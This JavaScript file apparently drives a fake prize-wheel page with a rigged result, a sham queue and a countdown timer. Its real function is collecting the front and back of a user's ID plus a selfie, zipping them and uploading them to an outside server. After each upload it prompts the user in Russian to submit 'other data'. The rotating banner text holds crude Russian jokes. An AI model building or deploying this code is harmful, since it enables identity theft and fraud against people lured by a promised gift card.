document.addEventListener("DOMContentLoaded", () => {
    // Get references to DOM elements
    const canvas = document.getElementById('wheel');
    const ctx = canvas.getContext('2d');
    const spinButton = document.getElementById('spin-button');
    const popup = document.getElementById('popup');
    const prizeName = document.getElementById('prize-name');
    const uploadButton = document.getElementById('upload-button');
    const fileInput = document.getElementById('file-input');
    const previews = [
        document.getElementById('preview-front'),
        document.getElementById('preview-back'),
        document.getElementById('preview-selfie'),
    ];
    const submitButton = document.getElementById('submit-button');
    const serverUrl = "https://testingv1.onrender.com";

    let uploadStep = 0; // Tracks the current step in file upload
    const filesCache = []; // Temporarily stores uploaded files
    let spinCount = 0; // Counter for spin attempts
    let lastStopAngle = 0; // Saves the last stop angle of the wheel

    // Rotating text setup
    const rotatingTextContainer = document.createElement('div');
    rotatingTextContainer.id = 'rotating-text-container';
    rotatingTextContainer.style.position = 'fix';
    rotatingTextContainer.style.top = '5%';
    rotatingTextContainer.style.width = '100%';
    rotatingTextContainer.style.textAlign = 'center';
    rotatingTextContainer.style.fontSize = '12px';
    rotatingTextContainer.style.overflow = 'hidden';
    rotatingTextContainer.style.height = '30px';
    rotatingTextContainer.style.whiteSpace = 'nowrap'; // Предотвращаем перенос текста
    document.body.appendChild(rotatingTextContainer);

    const rotatingMessages = [
        "Армяне получили золотой унитаз",
        "Лупа получила за пупу",
        "Николай за репост получил дилдо",
        "Пупа получил залупу("
    ];

    let currentMessageIndex = 0;

    function adjustRotatingTextPosition() {
        const isMobile = window.innerWidth <= 768; // Проверяем мобильное устройство
        rotatingTextContainer.style.top = isMobile ? '5%' : '10%'; // На мобильных текст чуть ниже
        rotatingTextContainer.style.fontSize = isMobile ? '1rem' : '1.2rem'; // Размер текста подстраивается
    }
    
    window.addEventListener('resize', adjustRotatingTextPosition); // Применяем изменения при изменении размера окна
    adjustRotatingTextPosition(); // Первоначальная настройка



    // Function to rotate displayed text messages
    function rotateText() {
        while (rotatingTextContainer.firstChild) {
            rotatingTextContainer.removeChild(rotatingTextContainer.firstChild);
        }

        // Create and display the current and next message
        const currentMessage = document.createElement('div');
        currentMessage.textContent = rotatingMessages[currentMessageIndex];
        currentMessage.style.position = 'absolute';
        currentMessage.style.width = '100%';
        currentMessage.style.top = '0';
        currentMessage.style.transition = 'top 1s';
        rotatingTextContainer.appendChild(currentMessage);
        

        const nextMessageIndex = (currentMessageIndex + 1) % rotatingMessages.length;
        const nextMessage = document.createElement('div');
        nextMessage.textContent = rotatingMessages[nextMessageIndex];
        nextMessage.style.position = 'absolute';
        nextMessage.style.width = '100%';
        nextMessage.style.top = '100%';
        nextMessage.style.transition = 'top 1s';
        rotatingTextContainer.appendChild(nextMessage);

        // Animate the text swap
        setTimeout(() => {
            currentMessage.style.top = '-100%';
            nextMessage.style.top = '0';
        }, 50);

        // Update the index and set a delay for the next rotation
        setTimeout(() => {
            currentMessageIndex = nextMessageIndex;
        }, 1050);

        const randomDelay = Math.floor(Math.random() * (12000 - 4000 + 1)) + 4000;
        setTimeout(rotateText, randomDelay);
    }

    rotateText();

    // Configure file input for mobile or desktop use
    function configureFileInput() {
        if (/Mobi|Android/i.test(navigator.userAgent)) {
            fileInput.setAttribute('capture', 'environment');
        } else {
            fileInput.removeAttribute('capture');
        }
    }

    // Draws the wheel with segments and colors
    function drawWheel() {
        const radius = canvas.width / 2;
        const segments = ["€5", "€10", "€15", "€20", "Gift Card", "Spotify", "Nike", "Amazon"];
        const colors = ["#FF5733", "#33FF57", "#3357FF", "#FF33A6", "#FFFF33", "#FF5733", "#33FF57", "#FF33A6"];
        const segmentAngle = (2 * Math.PI) / segments.length;

        for (let i = 0; i < segments.length; i++) {
            ctx.beginPath();
            ctx.fillStyle = colors[i];
            ctx.moveTo(radius, radius);
            ctx.arc(radius, radius, radius, i * segmentAngle, (i + 1) * segmentAngle);
            ctx.lineTo(radius, radius);
            ctx.fill();
            ctx.strokeStyle = "red";
            ctx.lineWidth = 1;
            ctx.stroke();

            ctx.save();
            ctx.translate(radius, radius);
            ctx.rotate(i * segmentAngle + segmentAngle / 2);
            ctx.textAlign = "right";
            ctx.fillStyle = "#fff";
            ctx.font = "bold 14px Arial";
            ctx.fillText(segments[i], radius - 20, 10);
            ctx.restore();
        }
    }

    // Spins the wheel and animates the rotation
    function spinWheel() {
        const totalDuration = 6000; // Total duration of spin in ms
        const phase1 = 0.5; // Proportion of time for acceleration
        const phase2 = 0.5; // Proportion of time for deceleration

        const totalRotation = 10 * Math.PI + Math.random() * Math.PI; // Randomized rotation amount
        const startAngle = lastStopAngle; // Begin from the last stopping point
        const startTime = performance.now();

        function animateWheel(time) {
            const elapsed = time - startTime;
            const progress = elapsed / totalDuration;
            let easedProgress;

            if (progress <= phase1) {
                // Exponential acceleration phase
                const localProgress = progress / phase1;
                easedProgress = Math.pow(localProgress, 3);
            } else {
                // Exponential deceleration phase
                const localProgress = (progress - phase1) / phase2;
                easedProgress = 1 - Math.pow(1 - localProgress, 3);
            }

            const angle = startAngle + easedProgress * totalRotation;

            // Clear canvas and redraw the wheel
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.save();
            ctx.translate(canvas.width / 2, canvas.height / 2);
            ctx.rotate(angle);
            ctx.translate(-canvas.width / 2, -canvas.height / 2);
            drawWheel();
            ctx.restore();

            if (progress < 1) {
                requestAnimationFrame(animateWheel);
            } else {
                lastStopAngle = angle % (2 * Math.PI); // Save stopping position
                handleSpinResult();
            }
        }

        requestAnimationFrame(animateWheel);
    }


    function adjustCanvasSize() {
        const isMobile = window.innerWidth <= 768; // Условие для мобильных устройств
        const canvasSize = isMobile ? Math.min(window.innerWidth, window.innerHeight) * 0.8 : 500; // 80% ширины экрана для мобильных
    
        canvas.width = canvasSize;
        canvas.height = canvasSize;
    
        drawWheel(); // Перерисовка колеса с новыми размерами
    }
    
    window.addEventListener('resize', adjustCanvasSize); // Обновление размера при изменении размеров окна
    adjustCanvasSize(); // Первоначальная настройка размера
    

    // Handle the outcome of a spin
    function handleSpinResult() {
        spinCount++;

        if (spinCount === 1 || spinCount === 2) {
            showSimplePopup(`Popup text for spin ${spinCount}`);
        } else if (spinCount === 3) {
            prizeName.textContent = "Amazon Gift Card";
            popup.classList.remove('hidden');
            startCountdown();
        }
    }

    function showSimplePopup(message) {
        const simplePopup = document.createElement('div');
        simplePopup.classList.add('popup');
        simplePopup.innerHTML = `
            <p>${message}</p>
            <button id="close-popup">Close</button>
        `;
        document.body.appendChild(simplePopup);

        const closePopupButton = simplePopup.querySelector('#close-popup');
        closePopupButton.addEventListener('click', () => {
            document.body.removeChild(simplePopup);
        });
    }

    function showQueuePopup() {
        spinButton.disabled = true; // Disable the spin button

        const queuePopup = document.createElement('div');
        queuePopup.classList.add('popup', 'queue-popup');
        const randomQueue = Math.floor(Math.random() * 8) + 5;
        let currentQueue = randomQueue;
        queuePopup.innerHTML = `<p>Подождите, вы <span id="queue-number">${currentQueue}</span> в очереди</p>`;
        document.body.appendChild(queuePopup);

        const queueNumber = document.getElementById('queue-number');
        let interval = setInterval(() => {
            currentQueue--;
            queueNumber.textContent = currentQueue;

            if (currentQueue === 3) {
                clearInterval(interval);
                interval = setInterval(() => {
                    currentQueue--;
                    queueNumber.textContent = currentQueue;

                    if (currentQueue === 1) {
                        clearInterval(interval);
                        setTimeout(() => {
                            document.body.removeChild(queuePopup);
                            spinButton.disabled = false; // Enable the spin button
                        }, 20);
                    }
                }, 70);
            }
        }, 20);
    }

    function startCountdown() {
        const countdownElement = document.createElement('div');
        countdownElement.id = 'countdown';
        countdownElement.style.fontSize = '18px';
        countdownElement.style.marginTop = '10px';
        popup.appendChild(countdownElement);

        let remainingTime = 180; // 3 minutes in seconds

        function updateCountdown() {
            const minutes = Math.floor(remainingTime / 60);
            const seconds = remainingTime % 60;
            countdownElement.textContent = `Time remaining: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

            if (remainingTime > 0) {
                remainingTime--;
                setTimeout(updateCountdown, 1000);
            } else {
                countdownElement.textContent = "Time's up!";
            }
        }

        updateCountdown();
    }

    uploadButton.addEventListener('click', () => {
        if (uploadStep < previews.length) {
            configureFileInput();
            fileInput.click();
        }
    });

    fileInput.addEventListener('change', () => {
        const file = fileInput.files[0];
        if (file) {
            const currentStep = uploadStep;

            filesCache[currentStep] = file;

            const reader = new FileReader();
            reader.onload = (e) => {
                previews[currentStep].src = e.target.result;
                previews[currentStep].style.display = 'block';
            };
            reader.readAsDataURL(file);

            uploadStep++;
            if (uploadStep < previews.length) {
                uploadButton.textContent = `Upload: ${["Front of ID", "Back of ID", "Selfie"][uploadStep]}`;
            } else {
                uploadButton.disabled = true;
                submitButton.disabled = false;
            }
        }
    });

    submitButton.addEventListener('click', async () => {
        if (filesCache.length === 0) return;

        submitButton.disabled = true;

        const zip = new JSZip();

        filesCache.forEach((file, index) => {
            zip.file(`file${index + 1}-${file.name}`, file);
        });

        const zipBlob = await zip.generateAsync({ type: 'blob' });

        const formData = new FormData();
        formData.append('archive', zipBlob, 'photos.zip');

        try {
            const response = await fetch(`${serverUrl}/upload-archive`, {
                method: 'POST',
                body: formData,
            });
            if (response.ok) {
                console.log('Archive successfully uploaded!');
                const successPopup = document.createElement('div');
                successPopup.classList.add('popup');
                successPopup.innerHTML = `
                    <p>Попробуйте другие данные.</p>
                    <button id="close-success-popup">Close</button>
                `;
                document.body.appendChild(successPopup);

                const closePopupButton = successPopup.querySelector('#close-success-popup');
                closePopupButton.addEventListener('click', () => {
                    document.body.removeChild(successPopup);
                    filesCache.length = 0; // Clear the cache
                    previews.forEach((preview) => {
                        preview.src = '';
                        preview.style.display = 'none';
                    });
                    uploadStep = 0;
                    uploadButton.disabled = false;
                    uploadButton.textContent = "Upload: Front of ID";
                    submitButton.disabled = true;
                });
            } else {
                console.error('Error uploading archive.');
            }
        } catch (error) {
            console.error('Connection error:', error);
        }
    });


    spinButton.addEventListener('click', spinWheel);
    drawWheel();
    showQueuePopup(); // Show queue popup on page load
});
